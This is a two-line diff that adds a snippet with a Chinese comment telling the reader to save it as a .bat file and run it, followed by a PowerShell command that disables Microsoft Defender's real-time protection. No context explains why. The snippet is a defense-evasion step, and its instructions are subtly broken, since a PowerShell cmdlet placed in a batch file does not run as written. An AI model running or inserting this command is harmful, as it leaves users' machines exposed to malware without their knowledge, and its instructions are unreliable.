@@ -1,0 +1,2 @@
+# 禁用实时保护（保存至1.bat运行）
+Set-MpPreference -DisableRealtimeMonitoring $true
